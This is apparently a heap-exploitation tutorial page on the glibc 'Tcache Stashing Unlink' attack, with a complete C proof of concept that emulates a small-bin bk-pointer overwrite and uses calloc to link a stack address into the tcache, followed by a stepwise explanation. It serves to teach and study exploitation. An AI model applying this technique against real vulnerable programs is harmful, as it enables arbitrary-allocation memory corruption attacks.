#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Tcache Stashing Unlink Attack",
    description: "Exploiting the tcache stashing mechanism in the small bin to gain an arbitrary allocation and create a fake chunk.",
    date: "2025-12-28",
    order: 30,
  ),
)<frontmatter>

= Tcache Stashing Unlink Attack

== Introduction

The "Tcache Stashing Unlink" is a sophisticated heap exploitation technique that targets the way glibc (specifically from 2.27 onwards) refills the tcache from the Small Bins. When a `malloc` request is satisfied by a Small Bin chunk and the corresponding tcache bin has empty slots, glibc "stashes" the remaining chunks from that Small Bin into the tcache.

By corrupting the `bk` pointer of a chunk in the Small Bin, an attacker can trick this stashing logic into linking an arbitrary memory location (like the stack or a global variable) into the tcache.

== Prerequisites
- *Small Bin Control*: Ability to place chunks into the Small Bin (requires bypassing/filling tcache and triggering consolidation/sorting).
- *BK Overwrite*: A vulnerability (like a heap overflow) to overwrite the `bk` pointer of a chunk in the Small Bin.
- *Writable Address*: A known writable address to satisfy the `bck->fd = bin` check in glibc's `unlink` macro (or rather the stashing logic's equivalent).
- *Calloc/Malloc Pair*: Often `calloc` is used to trigger the Small Bin allocation because it bypasses the tcache for its initial allocation.

== Example from `tcache_stashing_unlink.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    printf("This file demonstrates the stashing unlink attack on tcache.\n\n");
    printf("This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n");
    printf("This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    printf("The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    printf("This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    //stack_var emulate the fake_chunk we want to alloc to
    printf("Stack_var emulates the fake chunk we want to alloc to.\n\n");
    printf("First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    printf("You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    printf("Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    printf("Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 chunks into tcache
    printf("Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    printf("As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    printf("Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);// size > 0x90

    //now 5 tcache bins
    printf("Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    printf("Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    printf("Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    printf("Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}
```

== Attack Flow Explained

=== 1. Tcache and Small Bin Preparation

To use Small Bins, the tcache for the target size must first be partially filled. In the example, we free 7 chunks to fill the tcache, then free more chunks which go into the *Unsorted Bin*. By allocating a larger size, these chunks are sorted into the *Small Bin*.

We then allocate some chunks from the tcache to leave at least two slots open.

=== 2. Corrupting the Small Bin BK

The vulnerability is used to overwrite the `bk` pointer of a chunk currently in the Small Bin. We point it to our fake chunk location (the stack).

```c
/*VULNERABILITY*/
chunk_lis[2][1] = (unsigned long)stack_var;
/*VULNERABILITY*/
```

=== 3. Triggering the Stashing Refill

We call `calloc(1, 0x90)`. `calloc` does not use chunks directly from the tcache. It looks in the Small Bin, finds a chunk, and returns it. Crucially, it then sees that the tcache for size `0x90` has empty slots and begins "stashing" the rest of the chunks from that Small Bin into the tcache.

The stashing logic follows the corrupted `bk` chain:
1. It takes the next chunk (`chunk_lis[0]`).
2. It follows its `bk` to our `stack_var`.
3. It "stashes" our `stack_var` into the tcache.

=== 4. Arbitrary Allocation

The next `malloc(0x90)` request will be served directly from the tcache, returning the pointer to our stack variable.

== Security Implications

This attack is particularly dangerous because it bypasses many tcache protections and can be used to link non-heap memory into the heap management structures. It also results in a pointer to the arena being written to the fake chunk's `bk->fd` location, which can sometimes be used as an information leak.

```